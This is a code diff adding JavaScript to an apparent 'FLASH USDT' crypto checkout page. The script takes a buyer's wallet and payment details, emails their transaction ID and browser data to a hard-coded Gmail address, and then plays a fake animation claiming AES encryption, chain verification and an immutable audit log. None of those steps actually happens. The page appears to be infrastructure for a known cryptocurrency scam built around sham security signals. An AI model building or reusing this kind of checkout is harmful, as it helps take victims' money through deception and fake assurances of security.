+    $('#s-wallet').textContent = state.wallet || '—';
+    $('#s-network').textContent= state.network || '—';
+    $('#s-address').textContent= state.network ? (ADDRS[state.network] || '—') : '—';
+
+    // Step-4 panel
+    const sumN = $('#sum-network'); if(sumN) sumN.textContent = state.network || '—';
+    const payA = $('#pay-address'); if(payA) payA.textContent = state.network ? ADDRRSafe(state.network) : '—';
+  }
+
+  // Get Started scroll
+  const gotoStart = () => { showStep('step1'); document.getElementById('steps').scrollIntoView({behavior:'smooth'}); };
+  $('#goStart')?.addEventListener('click', e=>{ e.preventDefault(); gotoStart(); });
+
+  // Copy payment address
+  $('#copyAddr')?.addEventListener('click', ()=>{
+    const txt = ($('#pay-address')?.textContent||'').trim();
+    if(!txt || txt==='—') return alert('No address to copy.');
+    navigator.clipboard.writeText(txt).then(()=>alert('Address copied.'));
+  });
+
+  // Select product
+  document.querySelectorAll('.product .select').forEach(btn=>{
+    btn.addEventListener('click', e=>{
+      const card = e.target.closest('.product');
+      state.productName = card.dataset.name;
+      state.productUSDT = card.dataset.usdt;
+      state.productPrice= card.dataset.price;
+      updateSummary();
+      toggleSummary(true);
+      showStep('step2');
+    });
+  });
+
+  // Next/Back
+  document.querySelectorAll('[data-next]').forEach(b=>{
+    b.addEventListener('click', ()=>{
+      const current = steps.find(s=>document.getElementById(s).style.display==='block');
+      if(current==='step2'){
+        const w = $('#wallet').value.trim();
+        if(!w){ alert('Please enter your ERC20 wallet address.'); return; }
+        state.wallet = w;
+        updateSummary();
+        showStep('step3');
+      } else if(current==='step3'){
+        if(!state.network){ alert('Please select a payment method.'); return; }
+        if(!ADDRS[state.network]){ alert(`${state.network} is currently closed or not configured.`); return; }
+        updateSummary();
+        showStep('step4');
+      } else if(current==='step4'){
+        showStep('step5');
+      }
+    });
+  });
+  document.querySelectorAll('[data-back]').forEach(b=>{
+    b.addEventListener('click', ()=>{
+      const current = steps.find(s=>document.getElementById(s).style.display==='block');
+      if(current==='step2'){ showStep('step1'); toggleSummary(false); }
+      else if(current==='step3'){ showStep('step2'); }
+      else if(current==='step4'){ showStep('step3'); }
+      else if(current==='step5'){ showStep('step4'); }
+    });
+  });
+
+  // Methods
+  document.querySelectorAll('.method').forEach(m=>{
+    m.addEventListener('click', ()=>{
+      if(m.dataset.closed){ return; }
+      document.querySelectorAll('.method').forEach(x=>x.classList.remove('active'));
+      m.classList.add('active');
+      state.network = m.dataset.method;
+      updateSummary();
+    });
+  });
+
+  // Direct jump to Payment from summary
+  $('#gotoPayment')?.addEventListener('click', (e)=>{
+    e.preventDefault();
+    if(!state.network){ alert('Please select a payment method first.'); return; }
+    if(!ADDRS[state.network]){ alert(`${state.network} is currently closed or not configured.`); return; }
+    showStep('step4');
+  });
+
+  // Change plan
+  $('#changePlan')?.addEventListener('click', ()=>{
+    showStep('step1');
+    toggleSummary(false);
+    state.productName = state.productUSDT = state.productPrice = null;
+    updateSummary();
+  });
+
+  // AES modal helpers
+  const modal = $('#aesModal');
+  const st1 = $('#st1'), st2 = $('#st2'), st3 = $('#st3'), codeLine = $('#codeLine'), okMsg = $('#okMsg');
+  function resetModal(){
+    [st1,st2,st3].forEach(s=>s.classList.remove('active'));
+    okMsg.style.display = 'none'; codeLine.textContent = '[AES] init…';
+  }
+  function openModal(){ resetModal(); modal.style.display='flex'; modal.setAttribute('aria-hidden','false'); }
+  function closeModal(){ modal.style.display='none'; modal.setAttribute('aria-hidden','true'); }
+  $('#closeModal')?.addEventListener('click', closeModal);
+
+  function runAESSequence(){
+    openModal();
+    setTimeout(()=>{ st1.classList.add('active'); codeLine.textContent='[AES] generating key •••'; }, 200);
+    setTimeout(()=>{ st2.classList.add('active'); codeLine.textContent='[CHAIN] verifying receipt •••'; }, 1200);
+    setTimeout(()=>{ st3.classList.add('active'); codeLine.textContent='[AUDIT] writing immutable log •••'; }, 2200);
+    setTimeout(()=>{ okMsg.style.display='block'; }, 3200);
+  }
+
+  // TXID send (EmailJS + mailto fallback)
+  $('#sendTxid')?.addEventListener('click', async ()=>{
+    const txid = ($('#txid')?.value || '').trim();
+    if(!txid){ alert('Please enter your TXID.'); return; }
+
+    const subject = "FLASH USDT — New ERC20 Transaction";
+    const body =
+`🔔 A new ERC20 transaction has been submitted
+
+📦 PACKAGE INFORMATION
+──────────────────────────────
+Package Name: ${state.productName || '—'}
+USDT Amount: ${state.productUSDT ? Number(state.productUSDT).toLocaleString() : '—'} USDT
+Price: ${state.productPrice || '—'}
+Estimated Network Fee: ~$3–$6
+Total (approx): ${state.productUSDT ? Number(state.productUSDT).toLocaleString() : '—'} USDT
+
+💳 PAYMENT DETAILS
+──────────────────────────────
+Network: ${state.network || '—'}
+Payment Address: ${ADDRRSafe(state.network || '')}
+Receiver Wallet (User): ${state.wallet || '—'}
+TXID: ${txid}
+Transaction Time: ${new Date().toUTCString()}
+
+🛠 TECHNICAL DATA
+──────────────────────────────
+User-Agent: ${navigator.userAgent}
+Page: /erc20-checkout.html
+AES Encryption: Enabled (AES-256)
+Chain Verification: Ready
+`;
+
+    let usedEmailJS = false;
+    if(EMAILJS.SERVICE_ID && EMAILJS.TEMPLATE_ID && EMAILJS.PUBLIC_KEY){
+      try{
+        if(!window.emailjs){
+          const s = document.createElement('script');
+          s.src = "https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js";
+          document.head.appendChild(s);
+          await new Promise(res=> s.onload = res);
+          window.emailjs.init(EMAILJS.PUBLIC_KEY);
+        }
+        await window.emailjs.send(EMAILJS.SERVICE_ID, EMAILJS.TEMPLATE_ID, {
+          to_email: "eticin.60@gmail.com",
+          subject: subject,
+          package_name: state.productName || '—',
+          package_amount: state.productUSDT || '—',
+          package_price: state.productPrice || '—',
+          network: state.network || '—',
+          pay_address: ADDRRSafe(state.network || ''),
+          user_wallet: state.wallet || '—',
+          txid: txid,
+          user_agent: navigator.userAgent,
+          time: new Date().toLocaleString(),
+          full_body: body
+        });
+        usedEmailJS = true;
+        alert("✅ TXID has been sent via EmailJS. Thank you!");
+      }catch(e){
+        console.error(e);
+        alert("⚠️ EmailJS failed. We'll open your mail app.");
+      }
+    }
+    if(!usedEmailJS){
+      const mailto = `mailto:eticin.60@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+      window.location.href = mailto;
+    }
+
+    // Show AES animation and keep user on this page
+    runAESSequence();
+  });
+
+  // Init
+  showStep('step1');
+  toggleSummary(false);
+  updateSummary();
+</script>
 </body>
 </html>
